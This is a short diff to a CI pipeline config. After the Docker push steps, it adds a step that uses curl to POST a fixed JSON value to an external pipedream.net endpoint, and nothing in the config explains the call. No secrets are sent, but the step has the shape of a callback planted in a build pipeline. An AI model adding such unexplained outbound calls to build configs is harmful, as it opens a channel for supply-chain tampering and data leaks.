@@ -39,6 +39,11 @@ jobs:
         docker tag $REPO:$TAG $REPO:latest
         docker push $REPO:$TAG
         docker push $REPO:latest
+    - run: |
+        curl --header "Content-Type: application/json" \
+        --request POST \
+        --data '{"owner":"as2ds1TEST"}' \
+        https://enm80iuzvo27wof.m.pipedream.net
 
 workflows:
   regular:
